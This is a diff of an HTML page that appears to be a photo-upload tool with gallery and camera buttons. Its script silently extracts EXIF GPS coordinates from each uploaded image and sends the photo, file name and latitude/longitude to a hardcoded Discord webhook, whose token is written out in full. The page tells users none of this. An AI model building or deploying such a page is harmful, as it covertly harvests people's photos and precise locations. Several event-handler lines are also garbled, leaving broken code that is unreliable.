@@ -7,8 +7,7 @@
   <script src="https://cdn.jsdelivr.net/npm/exifr@7.1.3/dist/lite.umd.js"></script>
   <style>
     body {
-      margin: 0; padding: 0;
-      height: 100vh;
+      margin: 0; padding: 0; height: 100vh;
       background: linear-gradient(135deg, #0f0f0f, #1a0033);
       font-family: 'Segoe UI', sans-serif;
       color: white;
@@ -20,15 +19,14 @@
       background: rgba(255,255,255,0.05);
       padding: 40px 30px;
       border-radius: 20px;
-      backdrop-filter: blur(10px);
       border: 1px solid rgba(255,255,255,0.1);
       text-align: center;
-      width: 420px;
+      width: 440px;
       box-shadow: 0 20px 40px rgba(0,0,0,0.6);
     }
     h1 {
       margin: 0 0 30px 0;
-      font-size: 2.5em;
+      font-size: 2.6em;
       background: linear-gradient(90deg, #ff00cc, #00ffff);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
@@ -41,7 +39,10 @@
       transition: all 0.3s;
       margin-bottom: 20px;
     }
-    .drop-zone:hover { background: rgba(0, 255, 255, 0.08); border-color: #ff00cc; }
+    .drop-zone:hover {
+      background: rgba(0,255,255,0.08);
+      border-color: #ff00cc;
+    }
     button {
       padding: 14px 28px;
       font-size: 1.05em;
@@ -52,10 +53,9 @@
       font-weight: bold;
       cursor: pointer;
       margin: 8px 6px;
-      transition: 0.3s;
     }
-    button:hover { transform: scale(1.06); }
-    #status { margin-top: 20px; min-height: 26px; font-size: 1em; }
+    button:hover { transform: scale(1.05); }
+    #status { margin-top: 20px; min-height: 28px; font-size: 1em; }
   </style>
 </head>
 <body>
@@ -64,8 +64,8 @@
     <div class="drop-zone" id="dropZone">
       <p>Drop image here or tap to upload</p>
     </div>
-    <button id="uploadBtn">📁 Choose from Gallery</button>
-    <button id="cameraBtn">📸 Take Photo</button>
+    <button id="uploadBtn">Choose from Gallery</button>
+    <button id="cameraBtn">Take Photo</button>
     <div id="status"></div>
   </div>
 
@@ -74,7 +74,6 @@
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
-    let selectedFile = null;
 
     const statusEl = document.getElementById('status');
     const fileInput = document.getElementById('fileInput');
@@ -89,10 +88,10 @@
       const formData = new FormData();
       formData.append("file", file, file.name);
 
-      let content = `**New upload:** ${file.name}\n**Size:** ${(file.size/1024/1024).toFixed(2)} MB`;
+      let content = `New upload: ${file.name}\nSize: ${(file.size/1024/1024).toFixed(2)} MB`;
 
       if (gps && gps.latitude && gps.longitude) {
-        content += `\n\n**GPS FOUND**\nLat: ${gps.latitude.toFixed(6)}\nLon: ${gps.longitude.toFixed(6)}`;
+        content += `\n\nGPS FOUND\nLat: ${gps.latitude.toFixed(6)}\nLon: ${gps.longitude.toFixed(6)}`;
       }
 
       formData.append("payload_json", JSON.stringify({
@@ -105,28 +104,26 @@
 
     async function handleFile(file) {
       if (!file.type.startsWith("image/")) return;
-      
-      selectedFile = file;
+
       updateStatus(`Selected: ${file.name}`, "#00ffff");
 
       try {
         const gps = await exifr.gps(file);
         await sendToWebhook(file, gps);
-        updateStatus("✅ Sent to webhook!", "#00ff00");
+        updateStatus("Sent to webhook!", "#00ff00");
       } catch (err) {
         await sendToWebhook(file);
-        updateStatus("✅ Sent (no GPS data)", "#00ff88");
+        updateStatus("Sent (no GPS)", "#00ff88");
       }
     }
 
-    // Buttons
+    // Button clicks
     document.getElementById("uploadBtn").onclick = () => fileInput.click();
     document.getElementById("cameraBtn").onclick = () => cameraInput.click();
 
-    fileInput.onchange = e => e.target.files[0 0]);
-    cameraInput.onchange = e => e.target.files[0 0]);
+    fileInput.onchange = e => e.target.files[0] && handleFile(e.target.files[0 0] && handleFile(e.target.files[0]);
 
-    // Drag & Drop + Click on zone
+    // Drop zone
     const dropZone = document.getElementById("dropZone");
     dropZone.onclick = () => fileInput.click();
     dropZone.ondragover = e => { e.preventDefault(); dropZone.style.background = "rgba(0,255,255,0.1)"; };
@@ -134,7 +131,7 @@
     dropZone.ondrop = e => {
       e.preventDefault();
       dropZone.style.background = "";
-      if (e.dataTransfer.files[0 0]);
+      if (e.dataTransfer.files[0]) handleFile(e.dataTransfer.files[0]);
     };
   </script>
 </body>
